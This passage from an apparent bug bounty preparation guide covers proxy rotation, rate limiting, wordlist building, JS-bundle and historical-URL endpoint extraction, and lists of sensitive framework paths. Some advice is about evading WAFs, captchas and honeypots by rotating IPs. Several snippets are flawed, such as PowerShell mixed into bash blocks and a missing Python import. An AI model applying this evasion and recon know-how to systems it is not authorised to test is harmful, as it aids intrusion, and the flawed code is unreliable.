    "include": [
      {"protocol": "any", "host": "*.target.com"},
      {"protocol": "any", "host": "api.target.com"},
      {"protocol": "any", "host": "*.staging.target.com"}
    ],
    "exclude": [
      {"protocol": "any", "host": "*.cdn.target.com"},
      {"protocol": "any", "host": "*.3rdparty.com"},
      {"protocol": "any", "host": "*.analytics.target.com"}
    ]
  }
}
```

### 5.2 Proxy Chains (Multi-Geo Distribution)

Proxy chains distribute hunting traffic across multiple IPs and geographic regions to avoid WAF blocks and maintain access when one IP gets rate-limited.

```bash
# Proxychains configuration (Linux/WSL)
# /etc/proxychains.conf

strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Add proxies from different regions
socks5  us-proxy-1.target.com 1080
socks5  eu-proxy-1.target.com 1080
socks5  asia-proxy-1.target.com 1080
http    rotating-proxy.com:8080

# Windows: Use Proxifier or SocksCap64
# Or configure system proxy through Settings > Network > Proxy
```

**Proxy types for bug bounty:**

| Proxy Type | Cost | Reliability | Anonymity | Speed |
|-----------|------|-------------|-----------|-------|
| Datacenter proxies | Low ($1-3/GB) | High | Medium | Fast |
| Residential proxies | Medium ($5-10/GB) | Medium | High | Medium |
| ISP proxies | High ($10-20/GB) | High | High | Fast |
| Mobile proxies | Very High ($20-50/GB) | Low | Very High | Slow |
| Free proxies | Free | Very Low | Low | Very Slow |
| TOR | Free | Low | Very High | Very Slow |

**Rotating proxy configuration for Burp:**

```bash
# Burp upstream proxy configuration
# User options > Connections > Upstream Proxy Servers

# Add rules:
# *.target.com → us-proxy:1080  (US traffic)
# *.target.com → eu-proxy:1080  (EU traffic, alternate)
# (default) → direct connection

# For proxy rotation, use a script:
while ($true) {
    # Get fresh proxy from rotation service
    $proxy = (curl -s "https://proxy-rotation.com/next?service=residential").Content
    
    # Update Burp upstream proxy via REST API
    $body = @{host="*.target.com"; proxy=$proxy} | ConvertTo-Json
    curl -s -X POST "http://127.0.0.1:1337/v1/proxy" -Body $body -ContentType "application/json"
    
    Start-Sleep -Seconds 120  # Rotate every 2 minutes
}
```

**Geographic proxy strategy:**

```
For targets based in USA:
  - Primary proxy: US West (Oregon, California)
  - Secondary: US East (Virginia, New York)
  - Fallback: EU (Frankfurt, London)

For targets based in EU:
  - Primary proxy: EU (Frankfurt, London)
  - Secondary: US East (Virginia)
  - Fallback: US West

For targets based in Asia:
  - Primary proxy: Asia (Singapore, Tokyo)
  - Secondary: US West
  - Fallback: EU

Avoid:
  - Proxies from the same country as the target's HQ
    (They may have tighter IP restrictions)
  - Proxies from known VPN datacenters
    (DigitalOcean, AWS, Linode are often banned)
```

### 5.3 Rate Limiting Configuration

Rate limiting protects you from getting blocked. Every target has different thresholds, and you need to discover and respect them.

```bash
# Burp Intruder resource pool settings
# One pool for slow/burning testing
Name: slow-hunt
Max concurrent requests: 1
Delay between requests: 1000-3000ms (random)

# One pool for moderate testing
Name: medium-hunt
Max concurrent requests: 3
Delay between requests: 500-1000ms (random)

# One pool for fast testing (use cautiously)
Name: fast-hunt
Max concurrent requests: 10
Delay between requests: 0ms (no delay)

# ffuf rate limiting
ffuf -t 10 -rate 30 ...          # 30 req/sec (aggressive but safe)
ffuf -t 5 -rate 10 ...           # 10 req/sec (conservative)
ffuf -t 2 -rate 5 ...            # 5 req/sec (stealth)

# Curl with rate limiting
# PowerShell function for rate-limited requests
function Invoke-RateLimitedRequest {
    param($Url, $DelayMs = 1000)
    Start-Sleep -Milliseconds $DelayMs
    curl -s $Url
}
```

**Rate limit discovery methodology:**

| Threshold | Action | Risk |
|-----------|--------|------|
| 429 Too Many Requests | Back off 60s, use different proxy | Low — you discovered the limit |
| 403 Forbidden (WAF) | Back off 120s, rotate IP, change payload | Medium — WAF may remember you |
| 4xx generic | Back off 30s, slow down | Low — transient rate limit |
| 200 with captcha | Stop immediately, rotate IP | High — you're being tracked |
| 200 with empty body | You hit a honeypot, rotate everything | High — target is monitoring |

**Adaptive rate limiting script:**

```python
import time
import requests
from urllib.parse import urlparse

class AdaptiveRateLimiter:
    def __init__(self, base_delay=1.0):
        self.base_delay = base_delay
        self.consecutive_blocks = 0
        self.max_consecutive = 3
        
    def request(self, url, headers=None, method='GET', **kwargs):
        while True:
            resp = requests.request(method, url, headers=headers, **kwargs)
            
            if resp.status_code == 429:
                self.consecutive_blocks += 1
                backoff = self.base_delay * (2 ** self.consecutive_blocks)
                print(f"[RATE-LIMITED] Backing off {backoff:.0f}s")
                time.sleep(backoff)
                
                if self.consecutive_blocks >= self.max_consecutive:
                    print("[WARN] Rotating proxy...")
                    # Rotate proxy logic here
                    self.consecutive_blocks = 0
                continue
                
            if resp.status_code == 403 and 'block' in resp.text.lower():
                self.consecutive_blocks += 1
                backoff = self.base_delay * (3 ** self.consecutive_blocks)
                print(f"[BLOCKED] Backing off {backoff:.0f}s")
                time.sleep(backoff)
                continue
            
            self.consecutive_blocks = 0
            time.sleep(self.base_delay * (0.5 + 0.5 * random.random()))
            return resp
```

### 5.4 Wordlist Selection

The right wordlist makes the difference between finding endpoints and wasting requests.

```bash
# SecLists directory structure
# /usr/share/seclists/Discovery/Web-Content/
# ├── directory-list-2.3-*.txt        # General web directories
# ├── raft-*-files.txt                 # File extensions by tech
# ├── raft-*-directories.txt           # Directories by tech
# ├── Common-DB-Backups.txt            # Database backup files
# ├── Common-PHP-Filenames.txt         # PHP file names
# ├── API/                             # API-specific endpoints
# │   ├── api-endpoints.txt
# │   ├── graphql.txt
# │   └── rest-api.txt
# ├── IIS/                             # IIS-specific
# │   ├── IIS-files.txt
# │   └── IIS-directories.txt
# ├── Tomcat/                          # Tomcat-specific
# └── Others/                          # Misc
```

**Wordlist selection by target type:**

| Target Tech | Primary Wordlist | Secondary Wordlist |
|-------------|-----------------|-------------------|
| Generic/PHP | `directory-list-2.3-medium.txt` | `raft-large-php.txt` |
| ASP.NET | `directory-list-2.3-medium.txt` | `IIS/IIS-files.txt`, `raft-large-asp.txt` |
| Java/Tomcat | `directory-list-2.3-medium.txt` | `Tomcat/tomcat.txt` |
| API (REST) | `API/api-endpoints.txt` | Custom from JS bundles |
| GraphQL | `API/graphql.txt` | Custom from introspection |
| WordPress | `CMS/wp-known.txt` | `CMS/wp-plugins.txt` |
| Django | `directory-list-2.3-medium.txt` | Custom Django URL patterns |
| Rails | `directory-list-2.3-medium.txt` | Custom Rails route patterns |
| Node/Express | `directory-list-2.3-medium.txt` | Custom from package.json patterns |

**Wordlist filtering for efficiency:**

```bash
# Filter wordlists by response size to remove noise
# Step 1: Run wordlist, capture size of 404 responses
curl -s https://target.com/nonexistent -o /dev/null -w "%{size_download}"

# Step 2: Filter results to exclude 404 size
ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234  # fs = filter size

# Step 3: Build frequency-based wordlist from historical data
# (See Section 6: Wordlist Generation)
```

### 5.5 API Integration (Waybackurls, Gau, Katana)

Historical URL services find endpoints that are no longer linked but still functional.

```bash
# Waybackurls (Internet Archive)
waybackurls target.com | tee wayback.txt
# Returns historical URLs from Wayback Machine
# Can find: old endpoints, removed API routes, backup files

# Gau (Get All URLs)
gau target.com | tee gau.txt
# Multiple sources: Wayback, AlienVault, CommonCrawl
# Use --subs for subdomain URLs

# Katana (crawler + passive)
katana -u https://target.com -o katana.txt
# Passive mode: uses Wayback, AlienVault, CommonCrawl
# Active mode: crawls JavaScript, forms, links

# Combined historical URLs
waybackurls target.com | gau --subs target.com | sort -u > all_urls.txt
```

**What to extract from historical URLs:**

```bash
# Extract all unique paths
cat all_urls.txt | unfurl paths | sort -u > unique_paths.txt

# Extract all unique parameters
cat all_urls.txt | unfurl keys | sort -u > unique_params.txt

# Extract all unique parameter-value pairs
cat all_urls.txt | unfurl pairs | sort -u | cut -d= -f1 | sort -u

# Extract file extensions
cat all_urls.txt | grep -oP '\.[a-zA-Z]{2,4}(?=\?|$|/)' | sort -u

# Extract endpoints with sensitive keywords
cat all_urls.txt | grep -iE '(admin|api|internal|debug|test|dev|staging|backup|config|swagger|graphql)' > sensitive_urls.txt

# Extract potential IDOR parameters
cat all_urls.txt | grep -oP '(id|user_id|account_id|org_id|document_id)=[^&]+' | sort -u
```

**Historical data analysis workflow:**

1. Archive the URLs from all sources
2. Remove duplicates and sort
3. Extract unique paths (for directory brute-force wordlist)
4. Extract unique parameters (for parameter fuzzing)
5. Filter for sensitive keywords (admin, api, debug, etc.)
6. Test the filtered URLs for accessibility
7. Build a prioritized endpoint list from working URLs

---

## Wordlist Generation

Generic wordlists find generic bugs. Custom wordlists, built from the target's own code and data, find the bugs that nobody else has tested for.

### 6.1 Extracting Endpoints from JS Bundles

JavaScript bundles are the single richest source of hidden endpoints, internal routes, and undocumented API paths.

```bash
# 1. Collect all JS files from the target
cat live_hosts.txt | httpx -content-type | findstr "javascript" | cut -d' ' -f1 > js_urls.txt

# 2. Use LinkFinder to extract endpoints
linkfinder -i https://target.com/app.js -o cli | tee endpoints_js.txt

# 3. Use JS Miner (Burp extension)
# Configure: scope to target, auto-extract endpoints

# 4. Manual extraction with grep
curl -s https://target.com/app.js | findstr /R "/api/[a-zA-Z]" > api_endpoints.txt
curl -s https://target.com/app.js | findstr /R '"[A-Z]+ /[a-z]"' > route_patterns.txt

# 5. Extract from source maps
curl -s https://target.com/app.js.map | jq -r '.sources[]' > source_files.txt

# 6. Use relative URL extraction
curl -s https://target.com/app.js | findstr /R "'/[a-z]" > relative_paths.txt
```

**JS bundle extraction patterns:**

```javascript
// Extraction targets in JS bundles:

// Pattern 1: API endpoint strings
const endpoints = {
  users: '/api/v2/users',
  docs: '/api/v2/documents',
  share: '/api/v2/share/{id}',
  admin: '/api/v2/admin/users/{id}',
  // Internal endpoints
  internal: '/internal/v1/reports/all',
  debug: '/debug/cache/flush',
};

// Pattern 2: Route definitions (React Router, Vue Router)
<Route path="/admin/users/:id" component={UserAdmin} />
<Route path="/debug/flush-cache" component={CacheFlush} />
<Route path="/internal/dashboard" component={InternalDashboard} />

// Pattern 3: Axios/fetch calls
axios.get('/api/v3/users/' + userId + '/documents')
fetch('/api/v3/admin/users/batch', { method: 'POST' })

// Pattern 4: Environment variables with API URLs
const API_BASE = process.env.REACT_APP_API_URL || 'https://internal-api.target.com/v2'

// Pattern 5: GraphQL operation names
const GET_ALL_USERS = gql`query GetAllUsers { users { id email role } }`
const ADMIN_DELETE_USER = gql`mutation AdminDeleteUser($id: ID!) { deleteUser(id: $id) }`
```

**Real-world JS bundle find:**

> *"I downloaded the main.js bundle from a target (1.2MB minified). After beautifying, I searched for 'api' and found 47 endpoint strings — 31 of which weren't in their public API documentation. Among them: `/api/internal/health/db` (database health check — exposed db version), `/api/v3/admin/users/search?q=` (admin user search that didn't require admin), and `/api/v1/debug/env` (environment variables including Stripe API key). The debug endpoint returned the full environment including an AWS secret key. P1: $10,000."*
>
> — Anonymous H1 hunter, 2026

**Endpoint normalization from JS bundles:**

```bash
# Extract all URL patterns from JS
grep -oP '["'"'"'](https?://[^"'"'"']+|/[^"'"'"'\s]+)["'"'"']' app.js | tr -d '"' | sort -u

# Replace path parameters with generic placeholders
# /api/users/{id}/profile → /api/users/FUZZ/profile
# /api/documents/abc123/share → /api/documents/FUZZ/share
sed -E 's/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/FUZZ/g'

# Remove duplicates and sort
sort -u normalized_endpoints.txt > wordlist_js_endpoints.txt
```

### 6.2 Building Param Wordlists from Historical Data

Parameters are the keys to the kingdom. Every parameter is a potential injection point, an IDOR vector, or a mass assignment candidate.

```bash
# Extract all parameters from historical URLs
cat all_urls.txt | grep -oP '\?[^ ]+' | sed 's/\?//' | tr '&' '\n' | cut -d= -f1 | sort -u > params_historical.txt

# Extract parameter names from JavaScript
grep -oP 'params\.\w+|query\.\w+|body\.\w+|req\.params\.\w+' app.js | sort -u > params_js.txt

# Combine and rank by frequency
cat params_historical.txt params_js.txt | sort | uniq -c | sort -rn > params_ranked.txt

# Top parameters from ranked list (example output):
#  47 id
#  38 user_id
#  32 token
#  29 page
#  27 limit
#  25 sort
#  23 filter
#  22 search
#  20 type
#  19 status
```

**High-impact parameter categories:**

| Category | Parameters to Test | Bug Class |
|----------|-------------------|-----------|
| Identifiers | `id`, `user_id`, `account_id`, `org_id`, `document_id` | IDOR |
| Pagination | `page`, `limit`, `offset`, `start`, `count` | Mass data leak |
| Format | `format`, `export`, `output`, `type` | Format string, SSRF |
| Admin | `admin`, `is_admin`, `role`, `scope`, `internal` | Priv esc |
| Debug | `debug`, `test`, `dry_run`, `preview`, `validate` | Debug mode |
| Filter | `filter`, `search`, `q`, `query`, `where` | SQLi, NoSQLi |
| Auth | `token`, `api_key`, `secret`, `signature` | Token leak |
| Callback | `callback`, `url`, `webhook`, `redirect`, `next` | SSRF, open redirect |
| Version | `version`, `v`, `api_version`, `client_version` | API version bypass |
| Language | `lang`, `locale`, `language` | LFI, path traversal |

**Parameter fuzzing wordlist (built from real targets):**

```
id, user_id, account_id, org_id, team_id, workspace_id,
document_id, file_id, attachment_id, message_id, thread_id,
order_id, invoice_id, payment_id, transaction_id, subscription_id,
product_id, variant_id, sku_id, coupon_id, discount_id,
address_id, contact_id, customer_id, partner_id, vendor_id,
role_id, permission_id, group_id, policy_id, rule_id,
page, limit, offset, skip, take, count, start, end,
sort, order, sort_by, order_by, direction, ascending,
search, query, q, filter, where, match, term, keyword,
format, export, output, type, extension, filename, name,
admin, is_admin, superadmin, sudo, root, internal, debug,
preview, draft, test, dry_run, validate, simulate,
callback, redirect, next, return, url, webhook, endpoint,
token, api_key, api_secret, signature, nonce, timestamp,
version, v, api_version, app_version, build, revision,
lang, locale, language, region, country, timezone,
include, expand, embed, with, relations, fields, select,
scope, permission, access, role, level, tier, plan,
status, state, workflow, phase, step, current_stage,
batch, bulk, ids, collection, items, data, input,
```

### 6.3 Tech-Specific Wordlist Selection

Different technologies have different file patterns, directory structures, and parameter names.

```bash
# Django-specific paths
/admin/
/admin/login/
/api/v1/
/api/v2/
/graphql
/swagger
/redoc
/static/admin/
/media/          # File uploads
/robots.txt
/sitemap.xml
/health/
/healthcheck/
/__debug__/      # Django debug toolbar

# Rails-specific paths
/admin/
/assets/
/packs/
/rails/
/rails/info/
/rails/info/properties
/rails/info/routes     # Route listing!
/sidekiq/              # Job dashboard
/delayed_job/          # Job processing
/letter_opener/        # Email preview

# Express/Node-specific paths
/api/
/api-docs/
/swagger/
/graphql
/health
/healthz
/readiness
/metrics
/admin/
/.env
/webpack/
/sockjs-node/
/*.js.map             # Source maps (don't deploy these!)

# Spring Boot paths
/actuator/
/actuator/health
/actuator/info
/actuator/env
/actuator/beans
/actuator/mappings
/actuator/heapdump
/error
/api/
/swagger-ui.html
/v2/api-docs
/v3/api-docs

# Laravel paths
/admin/
/api/
/_debugbar/
/storage/
/storage/logs/
/.env
/artisan
/mix-manifest.json

# ASP.NET paths
/admin/
/api/
/swagger/
/swagger/v1/swagger.json
/*.aspx
/*.asmx
/*.svc
/WebResource.axd
/ScriptResource.axd
/trace.axd
/elmah.axd
```

**Tech-specific parameter names:**

| Framework | Common Parameter Names |
|-----------|----------------------|
| Django | `csrfmiddlewaretoken`, `next`, `format`, `page`, `csrf_token` |
| Rails | `authenticity_token`, `utf8`, `_method`, `commit`, `_session_id` |
| Express | `_csrf`, `session`, `redirect`, `callback`, `token` |
| Spring | `_csrf`, `spring-security-redirect`, `error`, `X-Auth-Token` |
| Laravel | `_token`, `_method`, `_token`, `XSRF-TOKEN`, `remember_token` |
| Flask | `csrf_token`, `next`, `session` (base64 cookie) |
| ASP.NET | `__VIEWSTATE`, `__EVENTVALIDATION`, `__VIEWSTATEGENERATOR` |

### 6.4 Custom Wordlist Creation from Source Code Patterns

When you have access to the target's source code (open-source target, leaked code, or GitHub), extract exact endpoint patterns.

```bash
# Extract Django URL patterns
grep -r "path(" app/ | grep -oP "'[^']+'" | tr -d "'" > django_urls.txt
grep -r "re_path(" app/ | grep -oP "'[^']+'" | tr -d "'" >> django_urls.txt

# Extract Rails routes
grep -r "get\|post\|put\|delete\|patch\|resources" config/routes.rb | \
    grep -oP '["'"'"'][^"'"'"']+["'"'"']' | tr -d '"'"'" > rails_routes.txt

# Extract Express routes
grep -r "router\.\(get\|post\|put\|delete\|patch\)" routes/ | \
    grep -oP "'[^']+'" | tr -d "'" > express_routes.txt

# Extract API annotations/comments
grep -r "@api\|@route\|@endpoint\|@path" app/ > api_annotations.txt

# Extract test file endpoints (often reference real endpoints)
grep -r "'/[a-z]" tests/ | grep -oP "'/[^',\s]+'" | tr -d "'" > test_endpoints.txt

# Extract from integration tests
grep -r "request\|fetch\|axios\|http" tests/integration/ | \
    grep -oP '["'"'"']/(api|v[0-9])[^"'"'"']+["'"'"']' | tr -d '"'"'" > integration_endpoints.txt
```

**Custom wordlist generation workflow:**

```bash
# Step 1: Collect from all sources
cat js_endpoints.txt > custom_wordlist.txt
cat historical_paths.txt >> custom_wordlist.txt
cat tech_specific_paths.txt >> custom_wordlist.txt
cat source_code_endpoints.txt >> custom_wordlist.txt

# Step 2: Normalize (lowercase, remove duplicates, sort)
Get-Content custom_wordlist.txt | ForEach-Object { $_.ToLower() } | Sort-Object -Unique > wordlist_normalized.txt

# Step 3: Filter by relevance (only paths, only params, etc.)
Select-String -Path wordlist_normalized.txt -Pattern "^/" > wordlist_paths.txt
Select-String -Path wordlist_normalized.txt -Pattern "^\w+(=|$)" > wordlist_params.txt

# Step 4: Remove noise (static files, images, etc.)
Select-String -Path wordlist_paths.txt -NotMatch "\.(jpg|png|gif|css|ico|svg|woff|ttf|eot)$" > wordlist_clean.txt

# Step 5: Add priority markers
# P0: admin, api, internal, debug, config, backup
# P1: v1, v2, graphql, swagger, health, metrics
# P2: everything else
```

---

## Pre-Hunt Checklist

The pre-hunt checklist is your safety net. Run through it before every hunting session. Missing one item can cost you an entire session.

### 7.1 Verify All Accounts Work

```
Account Verification Log
═══════════════════════════
Target: target.com
Date: 2026-06-16

Account A (free):           ✅ Session active, token not expired
Account B (free, alt):      ✅ Session active, token not expired  
Account C (premium):        ⚠️ Trial expires in 3 days — set renewal reminder
Account D (admin):          ❌ Password reset required

API Keys:
  Account A:                ✅ Works (curl verified)
  Account B:                ✅ Works (curl verified)
  Account C:                ✅ Works (curl verified)

Premium features accessible:
  ✅ Advanced search
  ✅ Export all formats
  ✅ Webhook management
  ⚠️ Admin panel — no admin access (need to escalate)
```

**Account verification script:**

```bash
# Quick account verification
function Test-Account {
    param($Name, $Url, $Token, $ExpectedCode = 200)
    
    $response = curl -s -o /dev/null -w "%{http_code}" `
        -H "Authorization: Bearer $Token" `
        $Url
    
    if ($response -eq $ExpectedCode) {
        Write-Host "$Name : ✅ Active (HTTP $response)"
        return $true
    } else {
        Write-Host "$Name : ❌ Failed (HTTP $response, expected $ExpectedCode)"
        return $false
    }
}

# Test each account
$accounts = @(
    @{Name="Account A"; Url="https://api.target.com/v1/user/me"; Token=$env:TOKEN_A},
    @{Name="Account B"; Url="https://api.target.com/v1/user/me"; Token=$env:TOKEN_B},
    @{Name="Account C"; Url="https://api.target.com/v2/user/me"; Token=$env:TOKEN_C}
)

foreach ($acct in $accounts) {
    Test-Account @acct
}
```

### 7.2 Verify All Proxies

```bash
# Test proxy connectivity
curl -s --proxy http://us-proxy:8080 https://api.ipify.org
# Should return the proxy IP, not your real IP

curl -s --proxy http://eu-proxy:8080 https://api.ipify.org
# Should return a different IP

# Test proxy chain in Burp
# Configure browser to use Burp (127.0.0.1:8080)
# Navigate to https://api.ipify.org — verify Burp shows the request
# Check the proxy chain is working: Upstream proxy should be visible in request

# Verify DNS goes through proxy (no DNS leaks!)
curl -s --proxy http://us-proxy:8080 https://ipleak.net
# Check that DNS shows the proxy location, not your real location
```

### 7.3 Verify Burp/Fiddler Ready

```bash
# Burp readiness:
# [ ] Project file loaded
# [ ] Scope configured (in-scope hosts highlighted)
# [ ] All extensions loaded
# [ ] Session handling rules active
# [ ] Cookie jar populated for all accounts
# [ ] Proxy listener running on 127.0.0.1:8080
# [ ] TLS certificate installed in browser
# [ ] Logger++ capturing all requests
# [ ] Repeater tabs from previous session cleaned up
# [ ] Intruder payload positions configured
# [ ] Collaborator client polling in background

# Quick Burp health check:
# 1. Open Firefox/Chrome with Burp CA cert installed
# 2. Navigate to https://target.com
# 3. Verify request appears in Target > Site Map
# 4. Verify Logger++ shows the request
# 5. Send to Repeater, modify, send — verify response changes
```

### 7.4 Verify Callback Server Running

```bash
# Interact.sh (aclu-tbeta)
interactsh-client -v
# Should output: [INF] Listing on <your-interactsh-url>
# Keep this terminal open — all callback testing goes through here

# Or: Burp Collaborator
# Burp > Project Options > Misc > Collaborator Server
# Check: "Use a polling collaborator server"
# Check: "Poll over unencrypted HTTP" 
# Test: Generate Collaborator payload, check client lists it

# Webhook.site
# Open https://webhook.site in browser
# Create a unique URL
# Keep the tab open — it auto-refreshes with incoming requests
```

### 7.5 Wordlists Loaded

```bash
# Verify wordlists are accessible
Test-Path -LiteralPath "SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt"
Test-Path -LiteralPath "custom_wordlists/target_endpoints.txt"
Test-Path -LiteralPath "params/top_1000_params.txt"

# Verify wordlist content (not empty)
Get-Content "custom_wordlists/target_endpoints.txt" | Measure-Object -Line

# Wordlists organized and ready:
# ├── wordlists/
# │   ├── general/
# │   │   ├── directory-list-2.3-medium.txt    (220K entries)
# │   │   ├── common.txt                        (4.7K entries)
# │   │   └── raft-large-files.txt              (400K entries)
# │   ├── target/
# │   │   ├── target_endpoints.txt              (custom, 1.2K entries)
# │   │   ├── target_params.txt                 (custom, 340 entries)
# │   │   └── historical_urls.txt               (custom, 8K entries)
# │   ├── params/
# │   │   ├── idor_params.txt                   (120 entries)
# │   │   ├── api_params.txt                    (250 entries)
# │   │   └── ssrf_params.txt                   (80 entries)
# │   └── payloads/
# │       ├── xss_payloads.txt
# │       ├── sqli_payloads.txt
# │       ├── ssti_payloads.txt
# │       └── ssrf_urls.txt
```

### 7.6 Scope Boundaries Confirmed

```bash
# Final scope check — read the program rules ONE MORE TIME
# Check:
# [ ] In-scope targets confirmed
# [ ] Out-of-scope targets noted (don't touch)
# [ ] Rate limits specified (respect them)
# [ ] Testing times allowed (some programs restrict hours)
# [ ] Authentication requirements (public only vs authenticated)
# [ ] Reporting guidelines (template, evidence format)
# [ ] Duplicate policy (first-to-report vs first-to-identify)
# [ ] Bounty range per severity (prioritize by payout)
# [ ] Safe harbor confirmed (don't access other user data without test accounts)
```

### 7.7 Prior-Art Search Complete

Before hunting, search for existing findings and disclosures to avoid duplicates and learn from others:

```bash
# Search disclosed reports on HackerOne
# https://hackerone.com/hacktivity?query=target.com

# Search Bugcrowd disclosed
# https://bugcrowd.com/crowdstream?q=target

# Search GitHub for target-specific security issues
# github.com/search?q=target.com+security&type=issues

# Search Twitter/X for target-specific findings
# twitter.com/search?q=target.com+bug+bounty

# Search write-up aggregators
# https://pentester.land/writeups/?search=target.com
# https://infosecwriteups.com/tagged/bug-bounty?source=search

# Check own duplicate database
# If you've hunted this target before, check your notes
Test-Path -LiteralPath "history/target.com_previous_findings.md"
```

**Prior-art analysis template:**

```markdown
## Prior-Art Analysis: target.com

### Past Disclosed Findings
- IDOR in document sharing (2025) — $2,500 — fixed
- XSS in search endpoint (2024) — $1,000 — fixed
- SSRF in PDF generator (2024) — $3,000 — fixed

### Tech Stack (from prior art)
- Backend: Rails 6.1 → 7.0 upgrade in progress
- Frontend: React 18
- Auth: Devise + JWT
- Hosting: AWS (us-east-1)
- CDN: Cloudflare

### Common Vulnerability Patterns Seen
- Mass assignment in profile updates (2 reports)
- IDOR in invoice access (3 reports)
- Session fixation (1 report)

### What This Tells Me
- Rails mass assignment is a recurring issue — test aggressively
- IDOR in financial features pays well — focus on invoices
- Session handling has been weak before — test JWT expiration logic
- Cloudflare WAF — need origin IP for bypass
```

---

## Environment Preparation

A clean, reproducible environment means you can hunt from anywhere without setup friction.

### 8.1 Containerized Tooling (Docker/Podman)

Containerized tools eliminate dependency hell and ensure consistent behavior across machines.

```bash
# Core hunting containers
docker run -d --name burp -p 8080:8080 burpsuite-pro:latest
docker run -d --name interactsh -p 80:80 interactsh:latest
docker run -d --name nuclei nuclei:latest
docker run -d --name ffuf ffuf:latest

# One-shot containers (no persistence needed)
docker run --rm -v ${PWD}:/data seclists ffuf -u https://target.com/FUZZ -w /data/SecLists/Discovery/Web-Content/common.txt

# Docker Compose for full toolkit
```

**Docker Compose hunting environment:**

```yaml
version: '3.8'
services:
  burp:
    image: burpsuite-pro:latest
    ports:
      - "8080:8080"
    volumes:
      - ./projects:/home/burp/projects
    restart: unless-stopped

  interactsh:
    image: interactsh:latest
    ports:
      - "80:80"
    restart: unless-stopped

  tools:
    image: bug-bounty-tools:latest
    volumes:
      - ./wordlists:/wordlists
      - ./output:/output
    command: tail -f /dev/null
    # Contains: ffuf, nuclei, httpx, subfinder, naabu, dnsx, etc.

  postgres:
    image: postgres:15
    environment:
      POSTGRES_DB: hunting
      POSTGRES_USER: hunter
      POSTGRES_PASSWORD: secret
    volumes:
      - ./db:/var/lib/postgresql/data
```

**Container management script:**

```bash
# Start all services
docker-compose up -d

# Execute commands inside tools container
docker exec tools ffuf -u https://target.com/FUZZ -w /wordlists/common.txt

# Access Burp UI
# Open browser to http://localhost:8080

# Stop everything
docker-compose down

# Update tool images
docker-compose pull
```

### 8.2 Python Virtualenvs

Python tools are the backbone of bug bounty. Isolate them in virtual environments.

```bash
# Create a dedicated venv for bug bounty
python -m venv C:\tools\bb-env
C:\tools\bb-env\Scripts\activate

# Install core tools
pip install requests httpx beautifulsoup4 selenium playwright
pip install arjun one-lin3r
pip install jsbeautifier

# Install custom scripts
pip install -e C:\tools\scripts\

# Create per-target venvs for tool-specific deps (optional)
python -m venv C:\tools\target-env\target1
```

**Python tool inventory (by category):**

| Category | Tools | Installation |
|----------|-------|-------------|
| Web requests | `requests`, `httpx`, `aiohttp` | `pip install` |
| HTML parsing | `beautifulsoup4`, `lxml`, `html5lib` | `pip install` |
| JS analysis | `jsbeautifier`, `esprima-python` | `pip install` |
| Browser automation | `selenium`, `playwright` | `pip install; playwright install` |
| Crypto | `pyjwt`, `cryptography`, `hashlib` | `pip install` |
| Utilities | `argparse`, `colorama`, `tqdm` | `pip install` |
| Network | `scapy`, `socket`, `dnspython` | `pip install` |

### 8.3 Node Version Management

Many recon tools (Katana, Httpx, Nuclei) require specific Node.js or Go versions.

```bash
# Install nvm-windows (Node Version Manager for Windows)
# https://github.com/coreybutler/nvm-windows

# Install Node.js LTS
nvm install lts
nvm use lts

# Verify
node --version
npm --version

# Global tools
npm install -g yarn
npm install -g js-beautify
npm install -g source-map-support
```

**Go tool installation (required for projectdiscovery tools):**

```bash
# Install Go
# https://go.dev/dl/

# ProjectDiscovery tools (go install)
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Other Go tools
go install -v github.com/tomnomnom/assetfinder@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/unfurl@latest
go install -v github.com/tomnomnom/qsreplace@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/ffuf/ffuf/v2@latest
```

### 8.4 Tool Version Verification

```bash
# Verify all essential tools are installed and at the right version
function Test-ToolVersion {
    param($Name, $Command, $MinVersion)
    
    try {
        $output = & cmd /c "$Command 2>&1"
        $version = if ($output -match '(\d+\.\d+\.\d+)') { $matches[1] }
        
        if ($version -and [version]$version -ge [version]$MinVersion) {
            Write-Host "$Name : ✅ $version (min $MinVersion)"
            return $true
        } else {
            Write-Host "$Name : ⚠️ $version (need $MinVersion+)" 
            return $false
        }
    } catch {
        Write-Host "$Name : ❌ Not found"
        return $false
    }
}

# Core tools
Test-ToolVersion "Python" "python --version" "3.9.0"
Test-ToolVersion "Node" "node --version" "18.0.0"  
Test-ToolVersion "Go" "go version" "1.20.0"
Test-ToolVersion "Nuclei" "nuclei -version" "3.0.0"
Test-ToolVersion "Httpx" "httpx -version" "1.3.0"
Test-ToolVersion "Subfinder" "subfinder -version" "2.5.0"
Test-ToolVersion "FFUF" "ffuf -V" "2.0.0"
Test-ToolVersion "Katana" "katana -version" "1.0.0"
```

**Tool health check when something fails:**

```
# Python tool fails → Check venv activated, dependencies installed
# Go tool not found → Check GOPATH and PATH include $GOPATH/bin
# Node tool fails → Check nvm is using correct version
# Docker tool fails → Check Docker Desktop is running
# curl fails → Check system proxy isn't interfering
# Burp fails → Check Java version (11+ required)
```

### 8.5 Dependencies Installed

```bash
# OS-level dependencies (Windows - use Chocolatey or winget)
choco install python nodejs golang git wget curl jq -y

# Python dependencies (one-time)
pip install -r requirements.txt
# Requirements:
# requests, httpx, beautifulsoup4, selenium, playwright
# pyjwt, cryptography, colorama, tqdm, termcolor
# jsbeautifier, esprima-python

# Playwright browsers (one-time)
playwright install chromium

# Security tools executable paths
# Download and place in PATH:
# - ffuf.exe
# - nuclei.exe
# - httpx.exe
# - subfinder.exe
# - naabu.exe
# - dnsx.exe
# - katana.exe
# - interactsh-client.exe
# - gau.exe
# - waybackurls.exe
# - qsreplace.exe
# - unfurl.exe
# - assetfinder.exe
```

---

## Monitoring Setup

